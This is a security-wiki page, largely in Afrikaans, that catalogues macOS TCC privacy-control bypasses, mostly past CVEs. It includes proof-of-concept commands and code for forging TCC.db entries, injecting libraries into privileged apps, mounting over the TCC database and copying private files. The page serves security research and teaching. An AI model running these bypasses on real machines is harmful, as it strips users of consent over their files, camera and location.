# macOS TCC Bypasses

{{#include ../../../../../banners/hacktricks-training.md}}

## Volgens funksionaliteit

### Write Bypass

Dit is nie 'n bypass nie, dit is bloot hoe TCC werk: **Dit beskerm nie teen skryf nie**. As Terminal **nie toegang het om die Desktop van 'n gebruiker te lees nie, kan dit steeds daarin skryf**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
Die **extended attribute `com.apple.macl`** word by die nuwe **file** gevoeg om die **creators app** toegang te gee om dit te lees.

### TCC ClickJacking

Dit is moontlik om **'n venster oor die TCC-prompt te plaas** om die gebruiker dit **te laat aanvaar** sonder dat hulle dit opmerk. Jy kan 'n PoC in [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)** vind.**

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC Request by arbitrary name

'n Attacker kan **apps met enige naam skep** (bv. Finder, Google Chrome...) in die **`Info.plist`** en dit toegang tot 'n TCC-beskermde ligging laat versoek. Die gebruiker sal dink dat die legit application die een is wat hierdie toegang versoek.\
Daarbenewens is dit moontlik om die legit app uit die Dock te **verwyder en die fake een daarin te plaas**, sodat dit, wanneer die gebruiker op die fake een klik (wat dieselfde ikoon kan gebruik), die legit een kan roep, TCC-permissies kan versoek en 'n malware kan uitvoer, terwyl die gebruiker glo dat die legit app die toegang versoek het.

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Meer info en 'n PoC in:


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

By verstek het 'n toegang via **SSH vroeër "Full Disk Access" gehad**. Om dit te deaktiveer, moet jy dit gelys maar gedeaktiveer hê (om dit uit die lys te verwyder, sal nie daardie privileges verwyder nie):

![TCC Request by arbitrary name - SSH Bypass: By verstek het 'n toegang via SSH vroeër "Full Disk Access" gehad. Om dit te deaktiveer, moet jy dit gelys maar gedeaktiveer hê (om dit...](<../../../../../images/image (1077).png>)

Hier kan jy voorbeelde vind van hoe sommige **malwares hierdie protection kon omseil**:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

> [!CAUTION]
> Let daarop dat jy nou **Full Disk Access** nodig het om SSH te kan enable

### Handle extensions - CVE-2022-26767

Die attribute **`com.apple.macl`** word aan files gegee om **'n sekere application permission te gee om dit te lees.** Hierdie attribute word gestel wanneer 'n file oor 'n app **gedrag\&drop** word, of wanneer 'n gebruiker 'n file **double-click** om dit met die **default application** oop te maak.

Daarom kon 'n gebruiker **'n malicious app registreer** om alle extensions te hanteer en Launch Services roep om enige file **oop te maak** (sodat die malicious file toegang verleen word om dit te lees).

### iCloud

Met die entitlement **`com.apple.private.icloud-account-access`** is dit moontlik om met die **`com.apple.iCloudHelper`** XPC service te kommunikeer, wat **iCloud tokens sal verskaf**.

**iMovie** en **Garageband** het hierdie entitlement en ander entitlements gehad wat dit toegelaat het.

Vir meer **information** oor die exploit om **iCloud tokens te verkry** deur daardie entitlement, kyk na die talk: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)

### kTCCServiceAppleEvents / Automation

'n App met die **`kTCCServiceAppleEvents`**-permission sal **ander Apps kan beheer**. Dit beteken dat dit moontlik die **permissions wat aan die ander Apps toegeken is, kan abuse**.

Vir meer info oor Apple Scripts, kyk:


{{#ref}}
macos-apple-scripts.md
{{#endref}}

Byvoorbeeld, as 'n App **Automation permission oor `iTerm`** het, het **`Terminal`** in hierdie voorbeeld toegang tot iTerm:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Over iTerm

Terminal, wat nie FDA het nie, kan iTerm, wat dit wel het, roep en dit gebruik om actions uit te voer:
```applescript:iterm.script
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```

```bash
osascript iterm.script
```
#### Via Finder

Of as ’n App toegang via Finder het, kan dit ’n script soos hierdie een wees:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## Volgens App behaviour

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

Die **userland tccd daemon** het die **`HOME`** **env**-veranderlike gebruik om toegang tot die TCC-gebruikersdatabasis te verkry vanaf: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

Volgens [hierdie Stack Exchange-plasing](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686), en omdat die TCC daemon via `launchd` binne die huidige gebruiker se domein loop, is dit moontlik om **alle omgewingsveranderlikes** wat daaraan oorgedra word, te **beheer**.\
Dus kon ’n **aanvaller die `$HOME`-omgewingsveranderlike** in **`launchctl`** instel om na ’n **beheerde** **gids** te wys, die **TCC** daemon te herbegin, en dan die **TCC-databasis direk te wysig** om aan homself **elke beskikbare TCC entitlement** te gee sonder om ooit die eindgebruiker te vra.\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Notes

Notes het toegang gehad tot TCC-beskermde liggings, maar wanneer 'n nota geskep word, word dit **in 'n nie-beskermde ligging geskep**. Jy kon Notes dus vra om 'n beskermde lêer na 'n nota te kopieer (dus na 'n nie-beskermde ligging) en dan toegang tot die lêer verkry:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

Die binary `/usr/libexec/lsd` met die library `libsecurity_translocate` het die entitlement `com.apple.private.nullfs_allow` gehad, wat dit toegelaat het om 'n **nullfs** mount te skep. Dit het ook die entitlement `com.apple.private.tcc.allow` met **`kTCCServiceSystemPolicyAllFiles`** gehad om toegang tot elke lêer te verkry.

Dit was moontlik om die quarantine-attribuut by "Library" te voeg, die **`com.apple.security.translocation`** XPC service aan te roep, waarna dit Library sou karteer na **`$TMPDIR/AppTranslocation/d/d/Library`**, waar toegang tot al die dokumente binne Library verkry kon word.

### CVE-2023-38571 - Music & TV <a href="#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv" id="cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv"></a>

**`Music`** het 'n interessante funksie: Wanneer dit loop, sal dit die lêers wat na **`~/Music/Music/Media.localized/Automatically Add to Music.localized`** gesleep word, **invoer** na die gebruiker se "media library". Verder roep dit iets soortgelyks aan: **`rename(a, b);`**, waar `a` en `b` die volgende is:

- `a = "~/Music/Music/Media.localized/Automatically Add to Music.localized/myfile.mp3"`
- `b = "~/Music/Music/Media.localized/Automatically Add to Music.localized/Not Added.localized/2023-09-25 11.06.28/myfile.mp3"`

Hierdie **`rename(a, b);`**-gedrag is kwesbaar vir 'n **Race Condition**, aangesien dit moontlik is om 'n vals **TCC.db**-lêer binne die `Automatically Add to Music.localized`-lêer te plaas en dan, wanneer die nuwe vouer(b) geskep word, die lêer te kopieer, dit te verwyder en daarna te laat wys na **`~/Library/Application Support/com.apple.TCC`**/.
**Meer inligting** [**in die writeup**](https://gergelykalman.com/CVE-2023-38571-a-macOS-TCC-bypass-in-Music-and-TV.html)


### SQLITE_SQLLOG_DIR - CVE-2023-32422

As **`SQLITE_SQLLOG_DIR="path/folder"`** ingestel is, beteken dit basies dat **enige oop db na daardie pad gekopieer word**. In hierdie CVE is hierdie beheer misbruik om **binne 'n SQLite-database te skryf** wat deur 'n proses met FDA oopgemaak gaan word - die TCC-database - en daarna **`SQLITE_SQLLOG_DIR`** met 'n **symlink in die lêernaam** te misbruik, sodat die gebruiker se **TCC.db met die oopgemaakte een oorskryf word** wanneer daardie database **oopgemaak** word.\
**Meer inligting** [**in die writeup**](https://gergelykalman.com/sqlol-CVE-2023-32422-a-macos-tcc-bypass.html) **en**[ **in die talk**](https://www.youtube.com/watch?v=f1HA5QhLQ7Y&t=20548s).

### **SQLITE_AUTO_TRACE**

As die omgewingsveranderlike **`SQLITE_AUTO_TRACE`** ingestel is, sal die library **`libsqlite3.dylib`** begin om alle SQL-navrae te **log**. Baie applications het hierdie library gebruik, dus was dit moontlik om al hul SQLite-navrae te log.

Verskeie Apple-applications het hierdie library gebruik om toegang tot TCC-beskermde inligting te verkry.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### MTL_DUMP_PIPELINES_TO_JSON_FILE - CVE-2023-32407

Hierdie **env variable word deur die `Metal` framework gebruik**, wat 'n dependency vir verskeie programme is, veral `Music`, wat FDA het.

Deur die volgende te stel: `MTL_DUMP_PIPELINES_TO_JSON_FILE="path/name"`. As `path` 'n geldige directory is, sal die bug aktiveer en kan ons `fs_usage` gebruik om te sien wat in die program aangaan:

- 'n lêer sal `open()` word met die naam `path/.dat.nosyncXXXX.XXXXXX` (X is random)
- een of meer `write()`s sal die inhoud na die lêer skryf (ons beheer dit nie)
- `path/.dat.nosyncXXXX.XXXXXX` sal na `path/name` `renamed()` word

Dit is 'n temporary file write, gevolg deur 'n **`rename(old, new)`** **wat nie secure is nie.**

Dit is nie secure nie omdat dit die ou en nuwe paths afsonderlik moet **resolve**, wat tyd kan neem en vatbaar kan wees vir 'n Race Condition. Vir meer information kan jy na die `xnu`-funksie `renameat_internal()` kyk.

> [!CAUTION]
> Basies, as 'n privileged process van 'n folder wat jy beheer hernoem, kan jy 'n RCE wen en dit 'n ander lêer laat access, of, soos in hierdie CVE, die lêer wat die privileged app geskep het, laat open en 'n FD stoor.
>
> As die rename access tot 'n folder het wat jy beheer, terwyl jy die source file gemodify het of 'n FD daarna het, verander jy die destination file (of folder) om na 'n symlink te point, sodat jy kan skryf wanneer jy wil.

Dit was die attack in die CVE: Om byvoorbeeld die gebruiker se `TCC.db` te overwrite, kan ons:

- `/Users/hacker/ourlink` skep om na `/Users/hacker/Library/Application Support/com.apple.TCC/` te point
- die directory `/Users/hacker/tmp/` skep
- `MTL_DUMP_PIPELINES_TO_JSON_FILE=/Users/hacker/tmp/TCC.db` stel
- die bug trigger deur `Music` met hierdie env variable te run
- die `open()` van `/Users/hacker/tmp/.dat.nosyncXXXX.XXXXXX` opvang (X is random)
- hier open ons ook hierdie lêer vir writing en hou die file descriptor
- `/Users/hacker/tmp` en `/Users/hacker/ourlink` atomies **in 'n loop** switch
- ons doen dit om ons kanse om suksesvol te wees te maksimeer, aangesien die race window redelik klein is, maar om die race te verloor het 'n minimale downside
- 'n rukkie wag
- toets of ons lucky was
- indien nie, run weer van bo af

Meer info by [https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html](https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html)

> [!CAUTION]
> As jy nou probeer om die env variable `MTL_DUMP_PIPELINES_TO_JSON_FILE` te gebruik, sal apps nie launch nie

### Apple Remote Desktop

As root kon jy hierdie service enable, en die **ARD agent sou full disk access hê**, wat dan deur 'n user misbruik kon word om 'n nuwe **TCC user database** te laat copy.

## Deur **NFSHomeDirectory**

TCC gebruik 'n database in die user se HOME folder om access tot resources spesifiek vir die user by **$HOME/Library/Application Support/com.apple.TCC/TCC.db** te beheer.\
Daarom, as die user dit regkry om TCC te restart met 'n $HOME env variable wat na 'n **ander folder** point, kan die user 'n nuwe TCC database in **/Library/Application Support/com.apple.TCC/TCC.db** skep en TCC mislei om enige TCC permission aan enige app te grant.

> [!TIP]
> Let daarop dat Apple die setting wat binne die user se profile gestoor is in die **`NFSHomeDirectory`**-attribute gebruik vir die **waarde van `$HOME`**. As jy dus 'n application compromise met permissions om hierdie waarde te modify (**`kTCCServiceSystemPolicySysAdminFiles`**) het, kan jy hierdie option met 'n TCC bypass **weaponize**.

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

Die **eerste POC** gebruik [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) en [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) om die user se **HOME** folder te modify.

1. Kry 'n _csreq_ blob vir die target app.
2. Plant 'n fake _TCC.db_-file met die vereiste access en die _csreq_-blob.
3. Export die user se Directory Services-entry met [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Modify die Directory Services-entry om die user se home directory te verander.
5. Import die gemodifiseerde Directory Services-entry met [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Stop die user se _tccd_ en reboot die process.

Die tweede POC het **`/usr/libexec/configd`** gebruik, wat `com.apple.private.tcc.allow` gehad het met die waarde `kTCCServiceSystemPolicySysAdminFiles`.\
Dit was moontlik om **`configd`** met die **`-t`**-option te run; 'n attacker kon 'n **custom Bundle om te load** spesifiseer. Daarom **vervang** die exploit die **`dsexport`**- en **`dsimport`**-method om die user se home directory te verander met 'n **`configd` code injection**.

Vir meer info, kyk na die [**original report**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).

## Deur process injection

Daar is verskillende techniques om code binne 'n process te inject en sy TCC privileges te abuse:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

Boonop is die algemeenste process injection wat gevind word om TCC te bypass via **plugins (load library)**.\
Plugins is ekstra code, gewoonlik in die vorm van libraries of plist, wat deur die **main application gelaai** sal word en onder sy context sal execute. As die main application dus access tot TCC-restricted files gehad het (via granted permissions of entitlements), sal die **custom code dit ook hê**.

### CVE-2020-27937 - Directory Utility

Die application `/System/Library/CoreServices/Applications/Directory Utility.app` het die entitlement **`kTCCServiceSystemPolicySysAdminFiles`** gehad, plugins met die **`.daplug`**-extension gelaai en **nie die hardened** runtime gehad nie.

Om hierdie CVE te weaponize, word die **`NFSHomeDirectory`** **verander** (deur die vorige entitlement te abuse) om die users se TCC database oor te neem en TCC te bypass.

Vir meer info, kyk na die [**original report**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).

### CVE-2020-29621 - Coreaudiod

Die binary **`/usr/sbin/coreaudiod`** het die entitlements `com.apple.security.cs.disable-library-validation` en `com.apple.private.tcc.manager` gehad. Die eerste het **code injection toegelaat**, en die tweede het dit access gegee om **TCC te manage**.

Hierdie binary het toegelaat dat **third party plug-ins** vanaf die folder `/Library/Audio/Plug-Ins/HAL` gelaai word. Daarom was dit moontlik om **'n plugin te load en die TCC permissions te abuse** met hierdie POC:
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
Vir meer inligting, raadpleeg die [**oorspronklike verslag**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).

### Device Abstraction Layer (DAL) Plug-Ins

System applications wat kamerastrome via Core Media I/O oopmaak (apps met **`kTCCServiceCamera`**) laai **hierdie plugins in die proses** wat in `/Library/CoreMediaIO/Plug-Ins/DAL` geleë is (nie deur SIP beperk nie).

Deur bloot 'n library met die algemene **constructor** daar te stoor, sal dit werk om **code te inject**.

Verskeie Apple applications was hiervoor kwesbaar.

### Firefox

Die Firefox application het die `com.apple.security.cs.disable-library-validation`- en `com.apple.security.cs.allow-dyld-environment-variables`-entitlements gehad:
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
Vir meer inligting oor hoe om dit maklik te exploit, [**kyk na die oorspronklike verslag**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).

### CVE-2020-10006

Die binary `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` het die entitlements **`com.apple.private.tcc.allow`** en **`com.apple.security.get-task-allow`** gehad, wat dit moontlik gemaak het om code binne die proses te inject en die TCC-privileges te gebruik.

### CVE-2023-26818 - Telegram

Telegram het die entitlements **`com.apple.security.cs.allow-dyld-environment-variables`** en **`com.apple.security.cs.disable-library-validation`** gehad. Dit was dus moontlik om dit te abuse om **access tot sy permissions te kry**, soos om met die camera op te neem. Jy kan [**die payload in die writeup vind**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).

Let op hoe die env variable gebruik is om ’n library te load: ’n **custom plist** is geskep om hierdie library te inject, en **`launchctl`** is gebruik om dit te launch:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## Deur `open`-aanroepe

Dit is moontlik om **`open`** aan te roep selfs terwyl jy sandboxed is.

### Terminal Scripts

Dit is redelik algemeen om Terminal **Full Disk Access (FDA)** te gee, ten minste op rekenaars wat deur tegniese mense gebruik word. En dit is moontlik om **`.terminal`**-scripts daarmee aan te roep.

**`.terminal`**-scripts is plist-lêers soos hierdie een, met die opdrag om uit te voer in die **`CommandString`**-sleutel:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
'n Toepassing kan 'n terminal script op 'n ligging soos /tmp skryf en dit met 'n command soos die volgende uitvoer:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## Deur mounting

### CVE-2020-9771 - mount_apfs TCC bypass en privilege escalation

**Enige gebruiker** (selfs onbevoorregte gebruikers) kan ’n Time Machine-snapshot skep en mount, en **toegang tot AL die lêers** van daardie snapshot verkry.\
Die **enigste voorreg** wat benodig word, is dat die toepassing wat gebruik word (soos `Terminal`) **Full Disk Access** (FDA)-toegang (`kTCCServiceSystemPolicyAllfiles`) het, wat deur ’n admin toegestaan moet word.
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
'n Meer gedetailleerde verduideliking kan in die [**oorspronklike verslag gevind word**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

### CVE-2021-1784 & CVE-2021-30808 - Mount over TCC file

Selfs al is die TCC DB-lêer beskerm, was dit moontlik om **'n nuwe TCC.db-lêer oor die gids te mount**:
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
Gaan die **full exploit** in die [**original writeup**](https://theevilbit.github.io/posts/cve-2021-30808/) na.

### CVE-2024-40855

Soos verduidelik in die [original writeup](https://www.kandji.io/blog/macos-audit-story-part2), het hierdie CVE `diskarbitrationd` misbruik.

Die funksie `DADiskMountWithArgumentsCommon` van die publieke `DiskArbitration` framework het die security checks uitgevoer. Dit is egter moontlik om dit te omseil deur `diskarbitrationd` direk aan te roep en dus `../`-elemente in die pad en symlinks te gebruik.

Dit het 'n aanvaller toegelaat om arbitrêre mounts op enige ligging uit te voer, insluitend bo-oor die TCC-database, weens die entitlement `com.apple.private.security.storage-exempt.heritable` van `diskarbitrationd`.

### asr

Die tool **`/usr/sbin/asr`** het dit moontlik gemaak om die hele disk te kopieer en dit op 'n ander plek te mount, wat TCC-protections omseil.

### Location Services

Daar is 'n derde TCC-database in **`/var/db/locationd/clients.plist`** om clients aan te dui wat toegelaat word om **toegang tot location services te verkry**.\
Die folder **`/var/db/locationd/` was nie teen DMG mounting beskerm nie**, en daarom was dit moontlik om ons eie plist te mount.

## Deur startup apps


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## Deur grep

In verskeie gevalle sal files sensitiewe inligting soos e-posadresse, telefoonnommers, boodskappe... op onbeskermde locations stoor (wat as 'n vulnerability in Apple tel).

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

Dit werk nie meer nie, maar dit [**het in die verlede gewerk**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

Nog 'n manier deur [**CoreGraphics events**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf) te gebruik:

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## Reference

- [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [**20+ Ways to Bypass Your macOS Privacy Mechanisms**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [**Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms**](https://www.youtube.com/watch?v=a9hsxPdRxsY)

{{#include ../../../../../banners/hacktricks-training.md}}
